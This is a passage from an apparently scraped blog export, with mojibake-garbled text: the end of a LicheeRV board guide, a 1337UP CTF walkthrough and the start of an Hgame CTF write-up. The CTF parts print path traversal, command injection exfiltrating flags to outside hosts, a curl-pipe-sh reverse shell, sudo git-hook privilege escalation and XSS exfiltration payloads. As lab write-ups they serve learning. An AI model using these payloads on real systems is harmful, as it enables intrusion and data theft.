/etc/apt/sources.list.d/speedtest.list # sudo apt-get update # sudo apt-get remove speedtest ## Other non-official binaries will conflict with Speedtest CLI # Example how to remove using apt-get # sudo apt-get remove speedtest-cli # sudo apt-get install curl curl -s https://install.speedtest.net/app/cli/install.deb.sh | sudo bash sudo apt-get install speedtest è¿™æ˜¯å®˜æ–¹çš„å®‰è£…æ–¹æ¡ˆï¼Œæç¤ºäº†å¦‚æœä¹‹å‰å®‰è£…è¿‡ speedtest-cli çš„è¯å…ˆç§»é™¤ã€‚ å¯æ¶å•Šï¼Œæ·»åŠ çš„è½¯ä»¶æºé‡Œä¸æ”¯æŒ riscv64. é‚£åœ¨å®˜ç½‘ä¸‹è½½é¢„ç¼–è¯‘çš„äºŒè¿›åˆ¶ç¨‹åºã€‚ çœ‹ä¸Šå»æ²¡æœ‰ riscv64 æ¶æ„çš„ï¼Œå””â€¦â€¦ï¼ˆå½“å–µå–µæ²¡è¯´ 0x0C å®‰è£… pip3sudo apt install python3-pip ä¹‹åå°±èƒ½ pip3 install xxx å•¦ï¼ 0x0D ä¸€äº›å…¶ä»–é—®é¢˜Broken packagessudo apt upgrade çš„æ—¶å€™å‘ç°é”…äº† sipeed@sipeed:~$ sudo apt upgrade Reading package lists... Done Building dependency tree... Done Reading state information... Done Calculating upgrade... Done Some packages could not be installed. This may mean that you have requested an impossible situation or if you are using the unstable distribution that some required packages have not yet been created or been moved out of Incoming. The following information may help to resolve the situation: The following packages have unmet dependencies: libwacom9 : Depends: libwacom-common (= 2.1.0-2) but 1.8-2 is to be installed E: Broken packages å‚è€ƒ Package blocking upgrades on Jammy è¿™ä¸ªï¼ŒæŠŠ libwacom2 ç§»é™¤å°±å¥½äº†ã€‚ï¼ˆè‰ sudo apt remove libwacom2 ä¹‹åå°±èƒ½æ‰§è¡Œ sudo apt upgrade äº†ã€‚ 0x0E å°ç»“ç”±äºå–µå–µç»éªŒä¸è¶³ï¼Œä¹Ÿæ˜¯ç¬¬ä¸€æ¬¡ç¢°è¿™æ¿å­ï¼Œå¯èƒ½è¯´çš„æœ‰é”™è¯¯çš„åœ°æ–¹ï¼Œå¸Œæœ›å¤§å®¶èƒ½å¤šå¤šæŒ‡æ­£å“ˆï¼ ï¼ˆè®ºå–µå–µç¿»è½¦äº†å¤šå°‘æ¬¡ æŒºæƒ³åæ§½çš„ä¸€ç‚¹æ˜¯ï¼Œè¿™ä¸ª WiFi èŠ¯ç‰‡è¿æ¥çš„ç¨³å®šæ€§ç¡®å®ä¸å’‹æ ·ï¼Œåœ¨æ²¡æœ‰è¿ HDMIã€ä¸²å£çš„æƒ…å†µä¸‹ï¼Œå–µå–µéƒ½å¾—å»è·¯ç”±å™¨çš„ç®¡ç†ç•Œé¢ä¸Šçœ‹è”ææ´¾æœ‰æ²¡æœ‰è¿ä¸Š WiFiï¼Œè€Œä¸”å³ä½¿è¿ä¸Šäº†ä¹Ÿä¸ä¸€å®šå°±èƒ½ ssh ä¸Šå»ï¼Œç”šè‡³ä¸ä¸€å®šèƒ½ ping é€šã€‚æ‰€ä»¥ç»å¸¸å¾—é‡å¯å‡ æ¬¡æ‰è¡Œâ€¦â€¦ï¼ˆæ‘Šæ‰‹ï¼Œéš¾éš¾ å¦å¤–ç›®å‰ RISV64 æ¶æ„çš„è½¯ä»¶æ”¯æŒè¿˜åœ¨è·¯ä¸Šï¼Œå¾ˆå¤šè½¯ä»¶è¿˜ä¸èƒ½ç›´æ¥æ‹¿æ¥ç”¨ï¼Œå¾—è‡ªå·±ç¼–è¯‘ï¼Œéš¾éš¾ã€‚ æ€»ä¹‹ï¼Œæ„Ÿè§‰è¿™æ¿å­ç›®å‰æ¥çœ‹åªèƒ½è¯´æ˜¯ä¸ªç©å…·ï¼Œæ‹¿æ¥æ•™å­¦ç§‘ç ”è¿˜æ˜¯æŒºæœ‰æ„ä¹‰çš„ï¼Œå·¥ä¸šåŒ–ç”Ÿäº§ç¯å¢ƒä½¿ç”¨çš„è¯è¿˜éœ€è¦æœ‰ä¸€æ®µç›¸å¯¹é•¿çš„è·¯è¦èµ°ï¼Œå¤§æ¦‚è¿™æ ·å­å§ã€‚ å¸Œæœ› RISCV ç¤¾åŒºèƒ½è¶Šåšè¶Šå¥½ï¼Œå›½äº§èŠ¯ç‰‡å’Œå›½äº§æ“ä½œç³»ç»Ÿèƒ½è¿›ä¸€æ­¥å‘å±•å§ï¼ 0xFF References &amp; Extended Reading å®˜æ–¹ Wikiï¼šLichee RV - Nezha CM LicheeRV å…¥é—¨å¼€å‘ä¸€å¸–é€š licheeRV 86å¼€å‘æ¿ä¹‹ä¸€ï¼šå¼€ç®±â€“è®¤è¯†å¼€å‘å¥—ä»¶ licheeRV 86å¼€å‘æ¿ä¹‹äºŒï¼šä¸Šæ‰‹â€“TFå¡é•œåƒçƒ§å½• licheeRV 86å¼€å‘æ¿ä¹‹ä¸‰ï¼šå¤–è®¾â€“ç‚¹ç¯ licheeRV 86å¼€å‘æ¿ä¹‹å››ï¼šå¤–è®¾â€“éŸ³é¢‘åŠŸèƒ½ licheeRV 86å¼€å‘æ¿ä¹‹äº”ï¼šå¤–è®¾â€“USBåŠç½‘ç»œ licheeRV 86å¼€å‘æ¿ä¹‹å…­ï¼šå¤–è®¾â€“å±æ˜¾è§¦æ‘¸ licheeRV 86å¼€å‘æ¿ä¹‹ä¸ƒï¼šDebiané•œåƒä½“éªŒ licheeRV 86å¼€å‘æ¿ä¹‹å…«ï¼šBSP SDK å¼€å‘ ã€å¹³å¤´å“¥Sipeed LicheeRV 86 Panelæµ‹è¯„ã€‘7-Waftå›¾å½¢ç•Œé¢å¼€å‘æµ‹è¯•ï¼ˆä¸‹ï¼‰ LicheeRV dockã®rootãƒœãƒªãƒ¥ãƒ¼ãƒ ã‚’æ‹¡å¼µã—ãŸã‚Šã„ã‚ã„ã‚ Sipeedè”ææ´¾Lichee RVï¼šå®‰è£…debianç³»ç»Ÿã€é…ç½®ç¯å¢ƒä¸å¤–å£³è®¾è®¡ç®€æ˜“æ•™ç¨‹ D1-H èŠ¯ç‰‡ä»‹ç» etc. ï¼ˆæºœäº†æºœäº†å–µ~","path":"2022/03/20/EE_LicheeRV_1_getting_started/"},{"title":"Pentest | 2022 1337UP LIVE CTF Workthrough","text":"Introduction 2022 1337UP LIVE CTF æ¯”èµ›ç±»å‹:Jeopardy[è§£é¢˜] æ¯”èµ›å½¢å¼:çº¿ä¸Š æ¯”èµ›æ—¶é—´:2022-03-11 23:00 ~ 2022-03-12 23:00 æ¯”èµ›å®˜ç½‘:https://ctf.intigriti.io/ å•Šï¼Œå¥½ä¹…æ²¡æ°´åšå®¢äº†ï¼Œæœ€è¿‘æ‰“æ¯”èµ›åŸºæœ¬æ˜¯å’Œé˜Ÿå‹ä¸€èµ·çœ‹çœ‹é¢˜ç›®ï¼Œç„¶è€Œé˜Ÿå‹å¤ªå¼ºäº†åŸºæœ¬ä¸éœ€è¦å–µå–µäº†ï¼Œè€ƒè™‘åˆ°å’±åšçš„ä¸å¤šä¹Ÿæ¯”è¾ƒæ‡’äºæ˜¯æ‡’å¾—å†™ writeup äº†ã€‚ï¼ˆä½ å°±æ˜¯æ‡’å§ï¼å‘œå‘œï¼Œåˆ«æ‰“å–µå–µï¼‰ å‘¨æœ«çœ‹åˆ°ç¾¤å‹å‘äº† 1337UP LIVE CTF è¿™ä¸ªå›½å¤–çš„æ¯”èµ›ï¼Œå‘¨å…­æ™šä¸Šå°±æ¥ç„äº†ä¸€çœ¼é¢˜ç›®ï¼Œçœ‹åˆ°äº† å¯çˆ±çŒ«çŒ«å›¾ç‰‡ è¿™ä¸ªé¢˜ç›®ï¼Œwow, how cute they are! Just do it! è¿™æ˜¯é“ åæ¸—é€ç±»å‹ çš„å¥—é¢˜ï¼Œä»¥è‡³äºè¿˜å•ç‹¬åˆ†äº†ä¸ªç±»ï¼Œäºæ˜¯æ¥ä¸‹æ¥å°±æ˜¯ä¸€äº› writeup æˆ–è€…è¯´æ˜¯ Workthrough äº†ã€‚ ï¼ˆä¸‹é¢ç”¨å˜¤è¯­å§ Sorry for my poor English. Lovely Kitten Pictures 1 Come here little kitty cat! ğŸ”— https://lovelykittenpictures.ctf.intigriti.io/ ğŸš© Flag format: 1337UP{} âœï¸ Created by Breno VitÃ³rio In this challenge, we get a website with a few lovely kittens. Click the Switch button and we will get another kitten picture. Letâ€™s see the JavaScript source code. let kitten = 0; changeKitten(); function changeKitten() { kitten = getRandomInt(1,11, kitten); fetch(`cat_info.php?id=${kitten}`) .then(async (response) =&gt; { let result = await response.json(); result = JSON.parse(result); const pictureContainer = document.getElementById(\"picture-container\"); const picture = pictureContainer.getElementsByTagName(\"img\")[0]; picture.src = `pictures.php?path=${result.Picture}`; picture.onload = (event) =&gt; { event.target.style.boxShadow = \"0px 0px 5px 5px rgba(0,0,0,0.2)\"; }; const span = document.getElementsByTagName(\"span\")[0]; span.innerText = result.Name; }); } function getRandomInt(min, max, except) { min = Math.ceil(min); max = Math.floor(max); let result = Math.floor(Math.random() * (max - min)) + min; while (result === except) { result = Math.floor(Math.random() * (max - min)) + min; } return result; } We get 2 APIs, cat_info.php?id= and pictures.php?path=, the former provides the cat info with specific id and the latter gives us the file with specific path. It is obviously that we can try path traversal vulnerability with the path parameter. Checking https://lovelykittenpictures.ctf.intigriti.io/pictures.php?path=../../../../../../../etc/passwd will return Not yet!, meaning that it is not ok. How about the file in the same directory? https://lovelykittenpictures.ctf.intigriti.io/pictures.php?path=pictures.php Visit it and we can get the source code of pictures.php, and meanwhile the filename of it is the first flag. 1337UP{K1TT3N_F1L3_R34D} Lovely Kitten Pictures 2 In ancient times cats were worshipped as gods; they have not forgotten this. In the same way, we can get other files in the directory. pictures.php &lt;?php $projectRoot = realpath(__DIR__); $relativePath = $_GET['path']; $absolutePath = realpath($projectRoot . \"/\" . $relativePath); if ($absolutePath === false || strcmp($absolutePath, $projectRoot . DIRECTORY_SEPARATOR) &lt; 0 || strpos($absolutePath, $projectRoot . DIRECTORY_SEPARATOR) !== 0) { echo \"Not yet!\"; http_response_code(404); die; } $splittedPath = explode('.', $relativePath); $fileExtension = end($splittedPath); if ($fileExtension === \"jpg\") { header('Content-type: image/jpeg'); $pictureName = \"photo\"; } else { header('Content-type: image/'.$fileExtension); $pictureName = file_get_contents(\"/flag1.txt\"); } header(\"Content-Disposition: filename=$pictureName-file.$fileExtension\"); header('Content-Transfer-Encoding: binary'); header('Expires: 0'); header('Cache-Control: must-revalidate, post-check=0, pre-check=0'); readfile($relativePath); die; ?&gt; cat_info.php &lt;?php $kittenID = $_GET['id']; $cmd = escapeshellcmd(\"/var/www/html/cat_info/main -c $kittenID\"); $output = shell_exec($cmd); if(sizeof(explode(\" \", $kittenID)) === 1) { header('Content-type: application/json'); /* So it only returns as JSON when there is no space character? */ echo json_encode($output); die; } echo \"&lt;pre&gt;\".$output.\"&lt;/pre&gt;\"; ?&gt; index.php is actually a HTML file without PHP functions, we can ignore it. From the souce we know that it exactly restrict the path to the projectRoot so that others can not get the /flag1.txt directly. And the cat_info.php will call a program /var/www/html/cat_info/main with escapeshellcmd. As we know, it cannot execute other shell commands because the special characters are escaped. escapeshellcmd(string $command): string escapeshellcmd() escapes any characters in a string that might be used to trick a shell command into executing arbitrary commands. This function should be used to make sure that any data coming from user input is escaped before this data is passed to the exec() or system() functions, or to the backtick operator. Following characters are preceded by a backslash: &amp;#;`|*?~&lt;&gt;^()[]{}$\\, \\x0A and \\xFF. ' and \" are escaped only if they are not paired. On Windows, all these characters plus % and ! are preceded by a caret (^). via https://www.php.net/manual/en/function.escapeshellcmd.php Next, we get /var/www/html/cat_info/main file with the url https://lovelykittenpictures.ctf.intigriti.io/pictures.php?path=cat_info/main . It is a program written in Golang. Using IDA to reverse it and we find that it has a help parameter -h, which can also be called with the API above, that is, https://lovelykittenpictures.ctf.intigriti.io/cat_info.php?id=1%20-h . BTW, we can get the health_checks/pictures.sh file, prompting us to execute commands with -e parameter. #!/bin/bash printf \"â€“â€“â€“â€“â€“â€“â€“â€“ Pictures Health Check â€“â€“â€“â€“â€“â€“â€“â€“\\n\\n\" for kitten in $(seq 1 10); do printf \"Testing Kitten $kitten: \" wget -q --spider \"http://localhost/assets/$kitten.jpg\" if [[ $? == 0 ]] then printf \"OK!\\n\\n\" else printf \"Not OK!\\n\\n\" fi done printf \"â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“ Tests done â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“\\n\\n\" Binary programs compiled from Golang are usually hard to reverse, but luckily this time it is so simple that from IDA we can find the way of processing -e param. It checks the input, which should start with http://localhost, and then execute wget -O - %s | /bin/bash command with the input. Apparently we can execute commands with backquote ( `whoami` ) and the keyword localhost in the URL can be a subdomain of your domain, or even function as a user accessing your domain (e.g. http://localhost@example.com ). Just like: http://localhost.114514.miaotony.xyz/?x=`whoami` http://localhost@114514.miaotony.xyz/?x=`cat /flag2.txt` Or we can just use the fuzz.red platform developed by my friends to get the http log. https://lovelykittenpictures.ctf.intigriti.io/cat_info.php?id=1%20-e%20%22http://localhost@wj0k.fuzz.red/?x=`cat%20/flag2.txt`%22 Got it! 1337UP{K1TT3N_BYP4SS_W1TH_4T_CH4R4CT3R} Lovely Kitten Pictures 3 A cat is an example of sophistication minus civilization. Furthermore, since the main program will call bash through pipeline (|), it is a good idea to put the reverse shell exploit on our web server and fetch it from the victim to get shell directly. One can find some useful reverse shell commands on https://sh.miaotony.xyz/ or Reverse Shell Generator . Or we can use something like Reverse Shell as a Service # 1. On your machine: nc -l 1337 # 2. On the target machine: curl https://resh.now.sh/yourip:1337 | sh It is pretty cool. https://lovelykittenpictures.ctf.intigriti.io/cat_info.php?id=1%20-e%20%22http://localhost@resh.now.sh/yourip:1337%22 Visit the payload and we get a reverse shell. And we find the Golang program has its source code called main.go in the same directoryâ€¦ Why didnâ€™t I try it? ((( And this is the source. package main import ( \"bytes\" \"encoding/json\" \"flag\" \"fmt\" \"os\" \"os/exec\" \"strings\" ) // The Kitten struct is the data structure which is going to represent each kitten type Kitten struct { Picture string Name string } func kittenHealthCheck(pictureURL string) { if strings.Index(pictureURL, \"http://localhost\") != 0 { fmt.Printf(\"[*] External requests are not allowed! ğŸˆ\") return } commandString := fmt.Sprintf(\"wget -O - %s | /bin/bash\", pictureURL) cmd := exec.Command(\"bash\", \"-c\", commandString) var stdout, stderr bytes.Buffer cmd.Stdout = &amp;stdout cmd.Stderr = &amp;stderr err := cmd.Run() if err != nil { fmt.Printf(\"Error: %s\\n\", err) return } output, _ := string(stdout.Bytes()), string(stderr.Bytes()) fmt.Printf(\"[*] Showing results &amp;#128008;\\n\\n%s\", output) } func help() { fmt.Printf(\"â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“ &amp;#128008; Lovely Kitten Data &amp;#128008; â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“\\n\\n\\n\") fmt.Printf(\"Flags:\\n\\n\") fmt.Printf(\"-h Asks for help &amp;#128008;\\n\") fmt.Printf(\"-c Pass the ID of a specific kitten &amp;#128008;\\n\") fmt.Printf(\"-e Pass a local health check in order to execute it (BETA) &amp;#128008;\\n\\n\\n\") fmt.Printf(\"â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“ &amp;#128008; Example Usage &amp;#128008; â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“\\n\\n\") fmt.Printf(\"./main -c 4 // Returns data about the 4th registered kitten\\n\") fmt.Printf(\"./main -e http://localhost/health_checks/pictures.sh // Checks if all the kitten pictures are available\\n\\n\") fmt.Printf(\"â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“ &amp;#128008; PS &amp;#128008; â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“\\n\\n\") fmt.Printf(\"For security reasons, the local health check functionality only allows requests that comes from localhost\") } func main() { var kittens = []Kitten{ { Picture: \"assets/1.jpg\", Name: \"Louie\", }, { Picture: \"assets/2.jpg\", Name: \"Jasper\", }, { Picture: \"assets/3.jpg\", Name: \"Biscuit\", }, { Picture: \"assets/4.jpg\", Name: \"Hot Wheels\", }, { Picture: \"assets/5.jpg\", Name: \"Nala\", }, { Picture: \"assets/6.jpg\", Name: \"Simba\", }, { Picture: \"assets/7.jpg\", Name: \"Mrs Norris\", }, { Picture: \"assets/8.jpg\", Name: \"Garfield\", }, { Picture: \"assets/9.jpg\", Name: \"Fluffer Nutter\", }, { Picture: \"assets/10.jpg\", Name: \"PeeWee\", }, } var kittenID int var askedForHelp bool var healthCheckInput string flag.IntVar(&amp;kittenID, \"c\", 0, \"\") flag.BoolVar(&amp;askedForHelp, \"h\", false, \"\") flag.StringVar(&amp;healthCheckInput, \"e\", \"\", \"\") flag.Parse() if askedForHelp { help() os.Exit(0) } if healthCheckInput != \"\" { kittenHealthCheck(healthCheckInput) return } if kittenID == 0 { fmt.Print(\"Flag -c expected, but no value was given to it &amp;#128008;\") os.Exit(-1) } jsonKitten, err := json.Marshal(kittens[kittenID-1]) if err != nil { fmt.Println(err) return } fmt.Print(string(jsonKitten)) } The / directory has the first 2 flags, so where are the last 2 flags? In /home dir, we find another 2 users. Maybe the flags are in each userâ€™s dir or /root dir. Itâ€™s time to elevate privilege now. In /tmp we see a script called linpeas.sh (uploaded by someone else), which is a part of PEASS-ng - Privilege Escalation Awesome Scripts SUITE new generation on GitHub. By executing it we can check the Local Linux Privilege Escalation checklist from book.hacktricks.xyz. Pay attention to the sudoerâ€™s config. www-data ALL=(ALL) NOPASSWD:/bin/su level1 level1 ALL=(admin) NOPASSWD:/usr/bin/git pull The current user www-data can execute /bin/su level1 via sudo without password, i.e., sudo su level1. Flag3 is done! 1337UP{SUP3R_34SY_K1TT3N_PR1V3SC} BTW, from pstree we can also know the way of other players hahaha. Lovely Kitten Pictures 4 Dogs come when theyâ€™re called; cats take a message and get back to you later. From sudoerâ€™s config we know the level1 user can exec /usr/bin/git pull with adminâ€˜s privilege. From GTFOBins and the git page on it we see that git hooks can execute some shell scripts. GTFOBins is a curated list of Unix binaries that can be used to bypass local security restrictions in misconfigured systems. Git hooks are merely shell scripts and in the following example the hook associated to the pre-commit action is used. Any other hook will work, just make sure to be able perform the proper action to trigger it. An existing repository can also be used and moving into the directory works too, i.e., instead of using the -C option. TF=$(mktemp -d) git init \"$TF\" echo 'exec /bin/sh 0&lt;&amp;2 1&gt;&amp;2' &gt;\"$TF/.git/hooks/pre-commit.sample\" mv \"$TF/.git/hooks/pre-commit.sample\" \"$TF/.git/hooks/pre-commit\" sudo git -C \"$TF\" commit --allow-empty -m x How can we hook git pull? stackoverflow: Is there any git hook for pull? https://git-scm.com/docs/githooks#_post_merge Yeah, post-merge can make it. And then we find a repository on GitHub, git-pull-priv-escalation , and after executing the following commands we get the final flag. mkdir /tmp/.miao cd /tmp/.miao git clone https://github.com/arnav-t/git-pull-priv-escalation cd git-pull-priv-escalation tar -xvf payload.tar payload cd payload/slave echo -e '#!/bin/bash\\n/bin/cat /home/admin/flag4.txt' &gt; .git/hooks/post-merge chmod -R 777 . sudo -u admin git pull 1337UP{1TS_TH3_F1N4L_K1TT3N} We use chmod here because when using sudo for admin user, he cannot change files in the current and .git directories. admin isnâ€™t like root user who can do everything he wants. But I donâ€™t know why using exec /bin/sh 0&lt;&amp;2 1&gt;&amp;2 for post-merge cannot give me the shell of admin user. Looks like nothing happens after pulling the repository and the user is still level1. (? Meanwhile, we find that for sudo one can only execute the specific command (git pull in this example) with no password, which means with other parameters we have to input the password. Therefore in this repository, the author configured 2 git repos, master and slave, and the slaveâ€˜s remote was pointed to master, which was set in slave/.git/config, in this way we donâ€™t have to add other params after git pull. Finally, letâ€™s clean something like the commands with our server info. (Maybe itâ€™s useless and unnecessaryâ€¦ hahaha ps -ef | grep wget | grep -v grep | awk '{print $2}' | xargs kill -9 ps -ef | grep main | grep -v grep | awk '{print $2}' | xargs kill -9 ConclusionBTW, we have tried some other methods to elevate privilege but all failed. For example, we found that the kernel version was 5.4.144+, which can not be exploited by the newest CVE-2022-0847 (a.k.a. Dirty Pipe, &gt;=5.8, &lt;5.16.11, 5.15.25 and 5.10.102). The sudo version was 1.8.31 but it had been fixed. Someone else pulled the exploit of CVE-2021-3156 but it couldnâ€™t be exploited. The pkexec command existed but the CVE-2021-4034 (a.k.a. PwnKit) didnâ€™t affect it. Maybe the author had fixed other known ways of pwning the machine, 23333. BTW, it was a k8s machine. So we finished all the challenges of the Lovely Kitten Pictures, but to some extent it was so easy for other players and I was so rubbish, 555. Many thanks for my teammate @nemo who solved the challenges with me. å–µå–µå¥½èœå•Šï¼Œå‘œå‘œï¼ˆ å½“ç„¶æ„Ÿè°¢ç†Šç†Š nemo ä¸€èµ·æ¥çœ‹é¢˜ï¼Œè´´è´´ï¼hhh å†™å˜¤è¯­å¥½ç´¯ï¼Œä¸ºå•¥æƒ³ä¸å¼€ç”¨è‹±è¯­å†™å•Š ï¼ˆæºœäº†æºœäº†å–µ~","path":"2022/03/13/Pentest_2022_1337UPLIVECTF/"},{"title":"CTF | 2022 Hgame Week2 WriteUp","text":"å¼•è¨€å–µå‘œï¼Œè¿™ç¯‡æ˜¯ Hgame Week2 çš„ WriteUp å•¦ï¼ å•Šä½ æ²¡çœ‹é”™ï¼Œå…¶å®å°±æ²¡å’‹çœ‹é¢˜ï¼Œå¤§éƒ¨åˆ†è¿˜æ˜¯ç¬¬ä¸€å‘¨ç»“æŸç¬¬äºŒå‘¨åˆšå¼€å§‹çš„é‚£å‡ å¤©åšçš„ï¼Œåé¢å°±å’•äº†ï¼ˆ ç¬¬ä¸€å‘¨çš„è¯¦è§ CTF | 2022 Hgame Week1 WriteUpã€‚ Webwebpack-engine Description webpack packs the web.ï¼ˆè¯·ä½¿ç”¨ Chrome æµè§ˆå™¨æ‰“å¼€ï¼‰ Challenge Address https://ngin.hgame.potat0.cc ç»å…¸ webpack æ‰“åŒ…ï¼Œæµè§ˆå™¨è¯·æ±‚ source map è§£åŒ…å°±èƒ½çœ‹åˆ°æºç äº†ã€‚ export default { data() { return { filiiililil4g: 'YUdkaGJXVjdSREJ1ZEY5bU1ISTVaWFJmTWw5RGJFOXpNMTlUTUhWeVkyVmZiVUJ3ZlE9PQo=' } } } äºŒæ¬¡base64 hgame{D0nt_f0r9et_2_ClOs3_S0urce_m@p} ï¼ˆä¸æ‡‚ä¸ºå•¥ FireFox å°±çœ‹ä¸åˆ° At0mçš„ç•™è¨€æ¿ Description ç•™è¨€ç«™è¢«æ—¥äº†ä¹‹åAt0må»è®¤çœŸå­¦äº†ä¸‹Webå®‰å…¨ï¼Œè¿™å›å°±ç®—æ˜¯å¤§èŒ„å­æ¥äº†ä¹Ÿåˆ«æƒ³è½»æ˜“æ—¥å¼€ã€‚https://at0m-hgame-wall0-1308188104.cos.ap-singapore.myqcloud.com/template.html æŠ¢å…ˆè¯•ç”¨At0mçš„ç•™è¨€æ¿è¯·åŠ å¾®ä¿¡å…¬ä¼—å·ï¼šå®…ç”·çš„å¤©å° Challenge Address https://weixin.qq.com/r/3xzJ0ZrEescFrd6y90nN ç»å…¸ XSSã€‚ç»™å…¬ä¼—å·å‘æ¶ˆæ¯ä¼šæŠŠå†…å®¹æ¸²æŸ“åˆ° content è¿™ä¸ª span é‡Œã€‚ å¸¦æœ‰ script è²Œä¼¼ä¼šæ‹¦ï¼Œä¸æ‡‚ä¸ºå•¥ window.flag æˆ–è€… flag è¯»ä¸åˆ°ä¸œè¥¿ï¼Œæœ€åç›´æ¥è¯» document.scripts ç®—äº†ã€‚ Payload: &lt;/span&gt;&lt;img src=1 onerror=\"document.getElementsByClassName('content')[0].textContent+=document.scripts[0].text;\"&gt; hgame{Xs5_1s_so_int3Restin9!Var_is_0uT_of_d4te} å¥½è€¶ï¼Œä¸€è¡€ï¼ å¦å¤–ä¹Ÿå¯ä»¥å¤–å¸¦ï¼ŒVPS ä¸Šèµ·ä¸ª nc å•¥çš„éƒ½è¡Œ &lt;/span&gt;&lt;img src=1 onerror=\"window.location='//VPSIP:PORT/'+document.scripts[0].text;\"&gt; é™¤å¤•çº¢åŒ…é™¤å¤•æ™šä¸Šä»¥è¿™é“é¢˜ä¸ºåŸºç¡€æ”¾äº†ä¸ªæ”¯ä»˜å®çº¢åŒ…ï¼Œå‘ç°æ˜¯åœ¨ scripts[1] æœ‰æ®µäº¿ç‚¹ç‚¹é•¿çš„ jsfuckï¼Œæ‰€ä»¥åŸæ¥çš„åšæ³•æ˜¯ éé¢„æœŸäº† çœ‹æ¥2333 ï¼ˆä»¥åŠåé¢åœ¨æ¦œå•ä¸Šçš„ id åé¢è¿˜è·å¾—äº†ä¸€ä¸ª å‘ç°éé¢„æœŸ çš„ tagï¼Œå¥½è€¶ ï¼ˆè™½ç„¶ OCR è²Œä¼¼ä¹Ÿä¸æ˜¯ä¸è¡Œ åæ¥æƒ³æƒ³è¿˜æ˜¯å¤–å¸¦å§ï¼Œæœ€å¥½å† base64 ç¼–ç ä¸€ä¸‹ &lt;/span&gt;&lt;img src=1 onerror=\"window.location='//VPSIP:PORT/'+btoa(document.scripts[1].text);\"&gt; è§£ç å‡ºæ¥æ˜¯ [][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]][([][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]((!![]+[])[+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+!+[]]+(+[![]]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+!+[]]]+(!![]+[])[!+[]+!+[]+!+[]]+(+(!+[]+!+[]+!+[]+[+!+[]]))[(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+([]+[])[([][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]][([][[]]+[])[+!+[]]+(![]+[])[+!+[]]+((+[])[([][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+(!![]+[]